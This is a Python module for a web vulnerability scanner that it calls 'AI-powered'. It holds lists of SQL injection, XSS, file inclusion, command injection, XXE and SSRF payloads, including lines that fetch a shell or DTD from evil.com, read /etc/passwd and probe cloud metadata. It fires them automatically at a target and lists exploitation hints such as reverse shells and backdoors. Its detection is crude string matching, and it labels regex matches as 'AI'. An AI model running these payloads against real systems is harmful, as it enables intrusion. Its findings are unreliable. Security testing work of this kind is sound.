#!/usr/bin/env python3
"""
Vulnerability Scanner Module - AI-Powered Zero-Day Detection
Author: Sayer Linux (SayerLinux1@gmail.com)
"""

import requests
import json
import re
import time
import random
import urllib.parse
from datetime import datetime
from colorama import Fore, Style
import concurrent.futures
import hashlib

class VulnScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Vulnerability signatures database
        self.vuln_signatures = {
            'sql_injection': {
                'payloads': [
                    "'", "''", "1' OR '1'='1", "1' OR 1 -- -", "1' OR 1=1--",
                    "1' UNION SELECT 1,2,3--", "1' AND 1=1--", "1' AND 1=2--",
                    "'; WAITFOR DELAY '0:0:5'--", "1' OR SLEEP(5)--",
                    "1' OR pg_sleep(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ],
                'indicators': [
                    'mysql_fetch_array', 'ORA-', 'PostgreSQL', 'SQLServer JDBC Driver',
                    'Microsoft OLE DB Provider', 'SQLite/JDBCDriver', 'MySqlException',
                    'valid MySQL result', 'MySqlClient', 'Warning.*mysql_.*',
                    'error.*SQL.*', 'SQL.*syntax.*', 'mysql.*error', 'SQL.*warning'
                ]
            },
            'xss': {
                'payloads': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<iframe src=javascript:alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<select onfocus=alert('XSS') autofocus>",
                    "<textarea onfocus=alert('XSS') autofocus>",
                    "<button onclick=alert('XSS')>Click</button>"
                ],
                'indicators': [
                    '<script>alert(', 'javascript:alert(', 'onerror=alert(',
                    'onload=alert(', 'onclick=alert(', 'onfocus=alert('
                ]
            },
            'lfi': {
                'payloads': [
                    "../../../etc/passwd", "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%c0%af..%c0%af..%c0%afetc/passwd",
                    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
                    "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "php://filter/read=convert.base64-encode/resource=config.php",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                    "expect://id", "php://input"
                ],
                'indicators': [
                    'root:', 'daemon:', 'bin:', 'sys:', 'nobody:',
                    'Windows\\System32', 'boot.ini', '[boot loader]',
                    'phpinfo()', '$_SERVER', '$_GET', '$_POST'
                ]
            },
            'rfi': {
                'payloads': [
                    "http://evil.com/shell.txt", "https://evil.com/shell.txt",
                    "ftp://evil.com/shell.txt", "php://filter/resource=http://evil.com/shell.txt",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                    "expect://whoami", "input://echo 'hacked'"
                ],
                'indicators': [
                    'hacked', 'shell_exec', 'system(', 'exec(', 'shell.txt',
                    'evil.com', 'malicious', 'backdoor'
                ]
            },
            'command_injection': {
                'payloads': [
                    "; id", "&& id", "| id", "`id`", "$(id)",
                    "; whoami", "&& whoami", "| whoami", "`whoami`", "$(whoami)",
                    "; cat /etc/passwd", "&& cat /etc/passwd", "| cat /etc/passwd",
                    "; dir", "&& dir", "| dir", "`dir`", "$(dir)",
                    "; ipconfig", "&& ipconfig", "| ipconfig", "`ipconfig`", "$(ipconfig)"
                ],
                'indicators': [
                    'uid=', 'gid=', 'groups=', 'root:', 'daemon:',
                    'Windows IP Configuration', 'Ethernet adapter', 'IPv4 Address',
                    'Directory of', 'Volume Serial Number'
                ]
            },
            'xxe': {
                'payloads': [
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe.dtd">]><foo>&xxe;</foo>'
                ],
                'indicators': [
                    'root:', 'daemon:', 'bin:', 'sys:', 'ENTITY',
                    'SYSTEM', 'file://', 'http://'
                ]
            },
            'ssrf': {
                'payloads': [
                    'http://localhost', 'http://127.0.0.1', 'http://0.0.0.0',
                    'http://169.254.169.254', 'http://metadata.google.internal',
                    'file:///etc/passwd', 'file:///windows/system32/drivers/etc/hosts',
                    'dict://127.0.0.1:11211/', 'gopher://127.0.0.1:25/'
                ],
                'indicators': [
                    'localhost', '127.0.0.1', 'metadata', 'internal',
                    'root:', 'daemon:', 'Windows\\System32'
                ]
            }
        }
        
        # Zero-day detection patterns using AI heuristics
        self.ai_patterns = {
            'input_validation': [
                r'input.*type.*text', r'textarea', r'select.*name',
                r'form.*action', r'input.*name.*\w+', r'method.*(get|post)'
            ],
            'file_upload': [
                r'input.*type.*file', r'upload.*file', r'file.*upload',
                r'enctype.*multipart', r'max.*file.*size'
            ],
            'authentication': [
                r'login.*form', r'password.*input', r'username.*input',
                r'authentication.*required', r'login.*required'
            ],
            'authorization': [
                r'admin.*panel', r'user.*management', r'role.*based',
                r'permission.*denied', r'access.*denied'
            ],
            'data_exposure': [
                r'sql.*error', r'database.*error', r'warning.*mysql',
                r'fatal.*error', r'parse.*error', r'syntax.*error'
            ]
        }
    
    def scan(self, target):
        """Main vulnerability scanning function"""
        print(f"{Fore.CYAN}[*] Starting AI-powered vulnerability scan...{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Run all vulnerability tests
        print(f"{Fore.YELLOW}[*] Testing for SQL Injection...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_sql_injection(target))
        
        print(f"{Fore.YELLOW}[*] Testing for XSS...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_xss(target))
        
        print(f"{Fore.YELLOW}[*] Testing for LFI/RFI...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_file_inclusion(target))
        
        print(f"{Fore.YELLOW}[*] Testing for Command Injection...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_command_injection(target))
        
        print(f"{Fore.YELLOW}[*] Testing for XXE...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_xxe(target))
        
        print(f"{Fore.YELLOW}[*] Testing for SSRF...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_ssrf(target))
        
        print(f"{Fore.YELLOW}[*] Running AI zero-day detection...{Style.RESET_ALL}")
        vulnerabilities.extend(self.ai_zero_day_detection(target))
        
        print(f"{Fore.YELLOW}[*] Testing for business logic flaws...{Style.RESET_ALL}")
        vulnerabilities.extend(self.test_business_logic(target))
        
        # Generate comprehensive results
        results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': len(vulnerabilities),
            'critical': len([v for v in vulnerabilities if v['severity'] == 'Critical']),
            'high': len([v for v in vulnerabilities if v['severity'] == 'High']),
            'medium': len([v for v in vulnerabilities if v['severity'] == 'Medium']),
            'low': len([v for v in vulnerabilities if v['severity'] == 'Low']),
            'vulnerabilities': vulnerabilities,
            'ai_analysis': self.generate_ai_analysis(vulnerabilities),
            'exploitation_paths': self.generate_exploitation_paths(vulnerabilities)
        }
        
        return results
    
    def test_sql_injection(self, target):
        """Test for SQL injection vulnerabilities"""
        vulns = []
        sql_data = self.vuln_signatures['sql_injection']
        
        # Test URL parameters
        test_urls = [
            f"{target}/search?q=test",
            f"{target}/user?id=1",
            f"{target}/product?id=1",
            f"{target}/page?id=1",
            f"{target}/article?id=1"
        ]
        
        for test_url in test_urls:
            for payload in sql_data['payloads']:
                try:
                    # Test in URL parameter
                    response = self.session.get(f"{test_url}{payload}", timeout=5)
                    if self.check_sql_injection(response, payload, sql_data['indicators']):
                        vulns.append({
                            'id': f"SQL-{hashlib.md5(f"{test_url}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'description': 'SQL Injection vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_sql_exploitation(payload)
                        })
                    
                    # Test in POST parameter
                    response = self.session.post(test_url, data={'q': payload}, timeout=5)
                    if self.check_sql_injection(response, payload, sql_data['indicators']):
                        vulns.append({
                            'id': f"SQL-{hashlib.md5(f"{test_url}POST{payload}".encode()).hexdigest()[:8]}",
                            'type': 'SQL Injection (POST)',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'description': 'SQL Injection vulnerability in POST parameter',
                            'proof': response.text[:200],
                            'exploitation': self.generate_sql_exploitation(payload)
                        })
                        
                except Exception as e:
                    continue
        
        return vulns
    
    def test_xss(self, target):
        """Test for XSS vulnerabilities"""
        vulns = []
        xss_data = self.vuln_signatures['xss']
        
        # Test various input points
        test_points = [
            f"{target}/search?q=",
            f"{target}/comment?text=",
            f"{target}/user?name=",
            f"{target}/message?content=",
            f"{target}/feedback?message="
        ]
        
        for test_point in test_points:
            for payload in xss_data['payloads']:
                try:
                    response = self.session.get(f"{test_point}{payload}", timeout=5)
                    if self.check_xss(response, payload, xss_data['indicators']):
                        vulns.append({
                            'id': f"XSS-{hashlib.md5(f"{test_point}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High',
                            'url': test_point,
                            'payload': payload,
                            'description': 'XSS vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_xss_exploitation(payload)
                        })
                except Exception as e:
                    continue
        
        return vulns
    
    def test_file_inclusion(self, target):
        """Test for Local/Remote File Inclusion"""
        vulns = []
        lfi_data = self.vuln_signatures['lfi']
        rfi_data = self.vuln_signatures['rfi']
        
        # Test file inclusion parameters
        test_params = ['file', 'page', 'path', 'template', 'include', 'url']
        
        for param in test_params:
            # Test LFI
            for payload in lfi_data['payloads']:
                try:
                    response = self.session.get(f"{target}?{param}={payload}", timeout=5)
                    if self.check_file_inclusion(response, payload, lfi_data['indicators']):
                        vulns.append({
                            'id': f"LFI-{hashlib.md5(f"{param}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'url': f"{target}?{param}={payload}",
                            'payload': payload,
                            'description': 'LFI vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_lfi_exploitation(payload)
                        })
                except Exception as e:
                    continue
            
            # Test RFI
            for payload in rfi_data['payloads']:
                try:
                    response = self.session.get(f"{target}?{param}={payload}", timeout=5)
                    if self.check_file_inclusion(response, payload, rfi_data['indicators']):
                        vulns.append({
                            'id': f"RFI-{hashlib.md5(f"{param}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'Remote File Inclusion (RFI)',
                            'severity': 'Critical',
                            'url': f"{target}?{param}={payload}",
                            'payload': payload,
                            'description': 'RFI vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_rfi_exploitation(payload)
                        })
                except Exception as e:
                    continue
        
        return vulns
    
    def test_command_injection(self, target):
        """Test for Command Injection"""
        vulns = []
        cmd_data = self.vuln_signatures['command_injection']
        
        # Test command injection parameters
        test_params = ['cmd', 'command', 'exec', 'run', 'system', 'shell', 'ping', 'nslookup']
        
        for param in test_params:
            for payload in cmd_data['payloads']:
                try:
                    response = self.session.get(f"{target}?{param}={payload}", timeout=5)
                    if self.check_command_injection(response, payload, cmd_data['indicators']):
                        vulns.append({
                            'id': f"CMD-{hashlib.md5(f"{param}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'url': f"{target}?{param}={payload}",
                            'payload': payload,
                            'description': 'Command injection vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_cmd_exploitation(payload)
                        })
                except Exception as e:
                    continue
        
        return vulns
    
    def test_xxe(self, target):
        """Test for XML External Entity (XXE)"""
        vulns = []
        xxe_data = self.vuln_signatures['xxe']
        
        # Test XML endpoints
        xml_endpoints = [
            f"{target}/api/xml", f"{target}/xml", f"{target}/soap",
            f"{target}/api/soap", f"{target}/webservice"
        ]
        
        for endpoint in xml_endpoints:
            for payload in xxe_data['payloads']:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=5)
                    if self.check_xxe(response, payload, xxe_data['indicators']):
                        vulns.append({
                            'id': f"XXE-{hashlib.md5(f"{endpoint}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'XML External Entity (XXE)',
                            'severity': 'High',
                            'url': endpoint,
                            'payload': payload,
                            'description': 'XXE vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_xxe_exploitation(payload)
                        })
                except Exception as e:
                    continue
        
        return vulns
    
    def test_ssrf(self, target):
        """Test for Server-Side Request Forgery (SSRF)"""
        vulns = []
        ssrf_data = self.vuln_signatures['ssrf']
        
        # Test SSRF parameters
        ssrf_params = ['url', 'uri', 'redirect', 'callback', 'webhook', 'endpoint', 'target', 'link']
        
        for param in ssrf_params:
            for payload in ssrf_data['payloads']:
                try:
                    response = self.session.get(f"{target}?{param}={payload}", timeout=5)
                    if self.check_ssrf(response, payload, ssrf_data['indicators']):
                        vulns.append({
                            'id': f"SSRF-{hashlib.md5(f"{param}{payload}".encode()).hexdigest()[:8]}",
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'High',
                            'url': f"{target}?{param}={payload}",
                            'payload': payload,
                            'description': 'SSRF vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_ssrf_exploitation(payload)
                        })
                except Exception as e:
                    continue
        
        return vulns
    
    def ai_zero_day_detection(self, target):
        """AI-powered zero-day vulnerability detection"""
        vulns = []
        
        # AI analysis of the target
        try:
            response = self.session.get(target, timeout=10)
            content = response.text
            
            # AI pattern matching for potential vulnerabilities
            for pattern_type, patterns in self.ai_patterns.items():
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        vulns.append({
                            'id': f"AI-{hashlib.md5(f"{pattern_type}{pattern}".encode()).hexdigest()[:8]}",
                            'type': f'Potential {pattern_type.replace("_", " ").title()}',
                            'severity': 'Medium',
                            'url': target,
                            'pattern': pattern,
                            'matches': matches[:5],
                            'description': f'AI detected potential {pattern_type.replace("_", " ")} vulnerability',
                            'proof': f'Pattern found: {pattern}',
                            'exploitation': self.generate_ai_exploitation(pattern_type, pattern)
                        })
            
            # AI-based anomaly detection
            anomalies = self.detect_anomalies(response)
            for anomaly in anomalies:
                vulns.append({
                    'id': f"AI-ANOMALY-{hashlib.md5(anomaly['description'].encode()).hexdigest()[:8]}",
                    'type': 'AI Detected Anomaly',
                    'severity': anomaly['severity'],
                    'url': target,
                    'description': anomaly['description'],
                    'proof': anomaly['proof'],
                    'exploitation': self.generate_anomaly_exploitation(anomaly)
                })
                
        except Exception as e:
            pass
        
        return vulns
    
    def test_business_logic(self, target):
        """Test for business logic vulnerabilities"""
        vulns = []
        
        # Test for IDOR (Insecure Direct Object References)
        idor_tests = [
            {'param': 'id', 'values': ['1', '2', '3', '999', '1000']},
            {'param': 'user_id', 'values': ['1', '2', '3', 'admin', '999']},
            {'param': 'order_id', 'values': ['1', '2', '3', '9999', '10000']}
        ]
        
        for test in idor_tests:
            param = test['param']
            for value in test['values']:
                try:
                    response = self.session.get(f"{target}?{param}={value}", timeout=5)
                    if self.check_idor(response, value):
                        vulns.append({
                            'id': f"IDOR-{hashlib.md5(f"{param}{value}".encode()).hexdigest()[:8]}",
                            'type': 'Insecure Direct Object Reference (IDOR)',
                            'severity': 'High',
                            'url': f"{target}?{param}={value}",
                            'parameter': param,
                            'value': value,
                            'description': 'IDOR vulnerability detected',
                            'proof': response.text[:200],
                            'exploitation': self.generate_idor_exploitation(param, value)
                        })
                except Exception as e:
                    continue
        
        return vulns
    
    def check_sql_injection(self, response, payload, indicators):
        """Check for SQL injection indicators"""
        content = response.text.lower()
        for indicator in indicators:
            if indicator.lower() in content:
                return True
        return False
    
    def check_xss(self, response, payload, indicators):
        """Check for XSS indicators"""
        content = response.text
        for indicator in indicators:
            if indicator in content:
                return True
        return False
    
    def check_file_inclusion(self, response, payload, indicators):
        """Check for file inclusion indicators"""
        content = response.text
        for indicator in indicators:
            if indicator in content:
                return True
        return False
    
    def check_command_injection(self, response, payload, indicators):
        """Check for command injection indicators"""
        content = response.text
        for indicator in indicators:
            if indicator in content:
                return True
        return False
    
    def check_xxe(self, response, payload, indicators):
        """Check for XXE indicators"""
        content = response.text
        for indicator in indicators:
            if indicator in content:
                return True
        return False
    
    def check_ssrf(self, response, payload, indicators):
        """Check for SSRF indicators"""
        content = response.text
        for indicator in indicators:
            if indicator in content:
                return True
        return False
    
    def check_idor(self, response, value):
        """Check for IDOR indicators"""
        # Simple heuristic: if we get different content for different IDs
        # This would need more sophisticated logic in real implementation
        return response.status_code == 200 and len(response.content) > 100
    
    def detect_anomalies(self, response):
        """Detect anomalies using AI heuristics"""
        anomalies = []
        
        # Check for unusual response codes
        if response.status_code in [500, 502, 503, 504]:
            anomalies.append({
                'description': 'Server error detected',
                'proof': f'Status code: {response.status_code}',
                'severity': 'Medium'
            })
        
        # Check for unusual headers
        unusual_headers = ['X-Debug-Token', 'X-Powered-By', 'X-Runtime', 'X-Backend']
        if any(header in response.headers for header in unusual_headers):
            anomalies.append({
                'description': 'Debug/development headers detected',
                'proof': 'Unusual headers found in response',
                'severity': 'Low'
            })
        
        return anomalies
    
    def generate_sql_exploitation(self, payload):
        """Generate SQL injection exploitation methods"""
        return {
            'data_extraction': "Use UNION SELECT to extract data from other tables",
            'authentication_bypass': "Use OR 1=1 to bypass authentication",
            'database_info': "Use database-specific functions to get version info",
            'file_access': "Use LOAD_FILE() to read files (MySQL)"
        }
    
    def generate_xss_exploitation(self, payload):
        """Generate XSS exploitation methods"""
        return {
            'session_hijacking': "Steal session cookies",
            'defacement': "Modify page content",
            'redirection': "Redirect users to malicious sites",
            'keylogging': "Capture user keystrokes"
        }
    
    def generate_lfi_exploitation(self, payload):
        """Generate LFI exploitation methods"""
        return {
            'file_reading': "Read sensitive files",
            'source_code': "Access application source code",
            'log_poisoning': "Poison logs to achieve RCE",
            'php_filter': "Use PHP filters to read PHP files"
        }
    
    def generate_rfi_exploitation(self, payload):
        """Generate RFI exploitation methods"""
        return {
            'remote_shell': "Include remote shell",
            'backdoor': "Install backdoor",
            'code_execution': "Execute arbitrary code",
            'web_shell': "Upload web shell"
        }
    
    def generate_cmd_exploitation(self, payload):
        """Generate command injection exploitation methods"""
        return {
            'reverse_shell': "Establish reverse shell",
            'file_access': "Read/write files",
            'system_info': "Gather system information",
            'privilege_escalation': "Attempt privilege escalation"
        }
    
    def generate_xxe_exploitation(self, payload):
        """Generate XXE exploitation methods"""
        return {
            'file_reading': "Read local files",
            'ssrf': "Perform SSRF attacks",
            'denial_of_service': "Cause DoS via entity expansion",
            'data_exfiltration': "Exfiltrate sensitive data"
        }
    
    def generate_ssrf_exploitation(self, payload):
        """Generate SSRF exploitation methods"""
        return {
            'internal_scanning': "Scan internal network",
            'cloud_metadata': "Access cloud metadata",
            'file_access': "Access local files",
            'service_abuse': "Abuse internal services"
        }
    
    def generate_idor_exploitation(self, param, value):
        """Generate IDOR exploitation methods"""
        return {
            'data_access': "Access other users' data",
            'privilege_escalation': "Access admin functions",
            'account_takeover': "Take over other accounts",
            'information_disclosure': "Disclose sensitive information"
        }
    
    def generate_ai_exploitation(self, pattern_type, pattern):
        """Generate AI-based exploitation methods"""
        return {
            'pattern_analysis': f"Analyze {pattern_type} patterns",
            'fuzzing': "Use AI-generated fuzzing payloads",
            'adaptive_testing': "Adapt tests based on responses",
            'machine_learning': "Use ML to find optimal payloads"
        }
    
    def generate_anomaly_exploitation(self, anomaly):
        """Generate anomaly exploitation methods"""
        return {
            'debug_exploitation': "Exploit debug information",
            'error_based': "Use error messages for reconnaissance",
            'information_gathering': "Gather information from anomalies"
        }
    
    def generate_ai_analysis(self, vulnerabilities):
        """Generate AI analysis of vulnerabilities"""
        return {
            'risk_assessment': self.assess_risk(vulnerabilities),
            'attack_scenarios': self.generate_attack_scenarios(vulnerabilities),
            'recommendations': self.generate_recommendations(vulnerabilities),
            'prioritization': self.prioritize_vulnerabilities(vulnerabilities)
        }
    
    def assess_risk(self, vulnerabilities):
        """Assess overall risk"""
        critical_count = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
        high_count = len([v for v in vulnerabilities if v['severity'] == 'High'])
        
        if critical_count > 0:
            return 'Critical Risk'
        elif high_count > 2:
            return 'High Risk'
        elif high_count > 0:
            return 'Medium Risk'
        else:
            return 'Low Risk'
    
    def generate_attack_scenarios(self, vulnerabilities):
        """Generate potential attack scenarios"""
        scenarios = []
        
        if any(v['type'] == 'SQL Injection' for v in vulnerabilities):
            scenarios.append('Data breach through SQL injection')
        
        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in vulnerabilities):
            scenarios.append('Session hijacking through XSS')
        
        if any('LFI' in v['type'] for v in vulnerabilities):
            scenarios.append('Source code disclosure through LFI')
        
        if any('Command Injection' in v['type'] for v in vulnerabilities):
            scenarios.append('System compromise through command injection')
        
        return scenarios
    
    def generate_recommendations(self, vulnerabilities):
        """Generate security recommendations"""
        recommendations = []
        
        if any(v['type'] == 'SQL Injection' for v in vulnerabilities):
            recommendations.append('Implement parameterized queries')
        
        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in vulnerabilities):
            recommendations.append('Implement input validation and output encoding')
        
        if any('LFI' in v['type'] for v in vulnerabilities):
            recommendations.append('Implement proper file path validation')
        
        if any('Command Injection' in v['type'] for v in vulnerabilities):
            recommendations.append('Avoid direct command execution with user input')
        
        return recommendations
    
    def prioritize_vulnerabilities(self, vulnerabilities):
        """Prioritize vulnerabilities for exploitation"""
        priority_order = ['Critical', 'High', 'Medium', 'Low']
        return sorted(vulnerabilities, key=lambda x: priority_order.index(x['severity']))
    
    def generate_exploitation_paths(self, vulnerabilities):
        """Generate exploitation paths"""
        paths = []
        
        # Find chains of vulnerabilities
        if any(v['type'] == 'SQL Injection' for v in vulnerabilities):
            paths.append('SQL Injection → Data Extraction → Privilege Escalation')
        
        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in vulnerabilities):
            paths.append('XSS → Session Hijacking → Account Takeover')
        
        if any('LFI' in v['type'] for v in vulnerabilities):
            paths.append('LFI → Source Code Analysis → Further Exploitation')
        
        if any('Command Injection' in v['type'] for v in vulnerabilities):
            paths.append('Command Injection → Reverse Shell → System Compromise')
        
        return paths